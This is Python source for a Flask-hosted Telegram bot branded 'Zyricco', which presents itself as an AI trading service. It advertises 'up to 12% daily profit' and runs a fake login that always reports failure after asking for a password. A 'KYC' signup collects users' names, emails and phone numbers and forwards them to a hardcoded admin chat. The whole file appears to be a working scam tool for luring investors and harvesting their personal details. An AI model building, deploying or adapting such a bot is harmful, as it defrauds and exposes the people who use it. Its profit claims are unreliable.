from flask import Flask, request
from telegram import Bot, Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
import os

# States
CHOOSING, LOGIN_USERNAME, LOGIN_PASSWORD, KYC_NAME, KYC_EMAIL, KYC_PHONE = range(6)

# Telegram Bot Token
TOKEN = os.environ.get("BOT_TOKEN")
bot = Bot(token=TOKEN)

# Flask app
app = Flask(__name__)
dispatcher = Dispatcher(bot=bot, update_queue=None, workers=1, use_context=True)

# Main Menu
def main_menu(update: Update, context: CallbackContext) -> int:
    buttons = [
        ['Login', 'Signup'],
        ['Our Services', 'Support'],
        ['Cancel']
    ]
    update.message.reply_text(
        "Welcome to **Zyricco** – Your AI-Powered Trading Partner!\n\nChoose an option:",
        reply_markup=ReplyKeyboardMarkup(buttons, resize_keyboard=True)
    )
    return CHOOSING

# Option Handler
def handle_choice(update: Update, context: CallbackContext) -> int:
    choice = update.message.text

    if choice == 'Login':
        update.message.reply_text("Enter your username:", reply_markup=ReplyKeyboardRemove())
        return LOGIN_USERNAME
    elif choice == 'Signup':
        update.message.reply_text("Let's get started with KYC. What's your full name?")
        return KYC_NAME
    elif choice == 'Our Services':
        services = (
            "**Zyricco Services:**\n"
            "- **AI Indicator**: Real-time trend detection\n"
            "- **GainX**: Earn up to 12% daily profit\n"
            "- **Funded Accounts**: Pass our evaluation, trade with Zyricco capital\n"
            "- **Account Management**: Let our pros grow your portfolio\n"
            "- **AI Signals**: Smart trading signals from our AI engine\n\n"
            "Need more info? Contact Support."
        )
        update.message.reply_text(services)
        return main_menu(update, context)
    elif choice == 'Support':
        update.message.reply_text("For support, contact us on Telegram: @zyricco_support")
        return main_menu(update, context)
    elif choice == 'Cancel':
        update.message.reply_text("Goodbye!", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END
    else:
        update.message.reply_text("Invalid choice. Please select from the menu.")
        return main_menu(update, context)

# Login Flow
def login_username(update: Update, context: CallbackContext) -> int:
    context.user_data['username'] = update.message.text
    update.message.reply_text("Now enter your password:")
    return LOGIN_PASSWORD

def login_password(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Login failed: Incorrect username or password.")
    return main_menu(update, context)

# Signup Flow (KYC)
def kyc_name(update: Update, context: CallbackContext) -> int:
    context.user_data['name'] = update.message.text
    update.message.reply_text("Email address?")
    return KYC_EMAIL

def kyc_email(update: Update, context: CallbackContext) -> int:
    context.user_data['email'] = update.message.text
    update.message.reply_text("Phone number?")
    return KYC_PHONE

def kyc_phone(update: Update, context: CallbackContext) -> int:
    context.user_data['phone'] = update.message.text
    user = context.user_data

    summary = (
        f"New Zyricco KYC Submission:\n"
        f"Name: {user['name']}\nEmail: {user['email']}\nPhone: {user['phone']}"
    )
    update.message.reply_text("KYC submitted successfully! Our team will reach out soon.")
    context.bot.send_message(chat_id=1841079821, text=summary)  # Replace with your admin ID

    return main_menu(update, context)

# Cancel
def cancel(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Action cancelled.", reply_markup=ReplyKeyboardRemove())
    return main_menu(update, context)

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[
        CommandHandler('start', main_menu),
        CommandHandler('menu', main_menu)
    ],
    states={
        CHOOSING: [MessageHandler(Filters.text & ~Filters.command, handle_choice)],
        LOGIN_USERNAME: [MessageHandler(Filters.text & ~Filters.command, login_username)],
        LOGIN_PASSWORD: [MessageHandler(Filters.text & ~Filters.command, login_password)],
        KYC_NAME: [MessageHandler(Filters.text & ~Filters.command, kyc_name)],
        KYC_EMAIL: [MessageHandler(Filters.text & ~Filters.command, kyc_email)],
        KYC_PHONE: [MessageHandler(Filters.text & ~Filters.command, kyc_phone)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

dispatcher.add_handler(conv_handler)

# Webhook route
@app.route("/", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return "ok"

# Home route
@app.route("/", methods=["GET"])
def home():
    return "Zyricco Bot is running!"

# Run app
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)